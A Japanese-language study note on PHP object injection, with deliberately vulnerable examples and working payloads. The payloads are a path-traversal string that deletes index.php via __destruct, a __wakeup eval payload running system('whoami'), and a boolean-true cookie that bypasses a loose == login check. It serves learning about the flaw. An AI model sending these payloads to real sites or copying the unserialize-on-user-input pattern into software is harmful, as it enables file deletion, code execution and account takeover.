# Unserialize
## Serializeの基本
```php
<?php
class Example1{
    public $cache_file;
}
class Example2{
    public $cache_file;
    public $array = array("key" => 100);
}

$ex1 = new Example1();
echo serialize($ex1)."\n";  // O:8:"Example1":1:{s:10:"cache_file";N;}
$ex1->cache_file = "index.php";
echo serialize($ex1)."\n";  // O:8:"Example1":1:{s:10:"cache_file";s:9:"index.php";}

$ex2 = new Example2();
echo serialize($ex2)."\n";  // O:8:"Example2":2:{s:10:"cache_file";N;s:5:"array";a:1:{s:3:"key";i:100;}}

// O:8:"Example2":2:{s:10:"cache_file";N;s:5:"array";a:1:{s:3:"key";i:100;}}
// Oは「”Example2”というObjectをシリアル化している」の意味
// 8は”Example2”の文字数
// 2は「フィールドが二つある」の意味
// sはStringの意味？
// 10は"cache_file"の文字数
// Nは値がセットされていないという意味。{変数名;値}でワンセットっぽい
// 最後の"i:100;"はint型の値100という意味
?>
```
## __destruct
```php
class Example1
{
   public $cache_file;

   function __construct(){
      // some PHP code...
   }
   // インスタンス削除時にデストラクタを実行して$cache_fileを削除する
   function __destruct(){
      $file = "/var/www/cache/tmp/{$this->cache_file}";
      if (file_exists($file)) @unlink($file);
   }
}

// some PHP code...

// GETメソッドの?data=以降の値をデシリアライズする
$user_data = unserialize($_GET['data']);

// some PHP code..
```
以下で、Example1クラスのオブジェクトとして復元して、Example1クラスのインスタンスを`$user_data`に代入するので、`$user_data`インスタンスが削除されるときに`../../index.php`が削除されてしまう！   
```txt
http://testsite.com/vuln.php?data=O:8:"Example1":1:{s:10:"cache_file";s:15:"../../index.php";}
```
## __wakeup

```php
<?php 
    class PHPObjectInjection{
        public $inject;
        function __construct(){
        }
        // このクラスをunserializeするときに__wakeup()を実行する
        function __wakeup(){
            if(isset($this->inject)){
                eval($this->inject);  // こんなことする場合ってあるのか？？
            }
        }
    }
    // $_REQUEST['r']はGETとPOSTとCOOKIEを合わせた連想配列。$_GET['r']とかと同じ
    if(isset($_REQUEST['r'])){  
        $var1=unserialize($_REQUEST['r']);
        if(is_array($var1)){
            echo "<br/>".$var1[0]." - ".$var1[1];
        }
    }
    else{
        echo ""; # nothing happens here
    }
?>
```
GETのデータとかCookieのデータとかで`system("whoami")`を実行する。   
```txt
?r=O:18:"PHPObjectInjection":1:{s:6:"inject";s:17:"system('whoami');";}
Cookie: r=O%3A18%3A%22PHPObjectInjection%22%3A1%3A%7Bs%3A6%3A%22inject%22%3Bs%3A17%3A%22system%28%27whoami%27%29%3B%22%3B%7D
```
## AuthBypass TypeJuggling
```php
// 一見、どう見ても安全に見えるが実はがちがちに脆弱。ヤバすぎてワロタ
data = unserialize($_COOKIE['auth']);

// "=="で比較しているため、TypeJugglingにより、 true(boolean) == "admin"(string) はTrueとなるので危険！
if ($data['username'] == $adminName && $data['password'] == $adminPassword) {
    $admin = true;
} else {
    $admin = false;
}
```
以下でAuthBypassのためのPayloadを作成。   
```php
<?php
$data = array("username" => true, "password" => true);
echo serialize($data)."\n"; // a:2:{s:8:"username";b:1;s:8:"password";b:1;}

// "username"のValueの値をBooleanのTrueにするとTypeJugglingによりAuthBypassできる！
echo gettype(true == "admin")." : ".(true == "admin")."\n";  // boolean : 1
echo gettype(true === "admin")." : ".(true === "admin")."\n"; // boolean : 
?>
```
作成した`a:2:{s:8:"username";b:1;s:8:"password";b:1;}`をURL encodeしてCookieにセットすればBypassできる！   
```txt
Cookie: auth=a%3A2%3A%7Bs%3A8%3A%22username%22%3Bb%3A1%3Bs%3A8%3A%22password%22%3Bb%3A1%3B%7D
```
## AuthBypass ObjectReference
## POP chain (SQL Injection)
# 参考
https://securitycafe.ro/2015/01/05/understanding-php-object-injection/   
基本的な説明。わかりやすい。   
https://nitesculucian.github.io/2018/10/05/php-object-injection-cheat-sheet/   
具体例がたくさん。よさげ。   
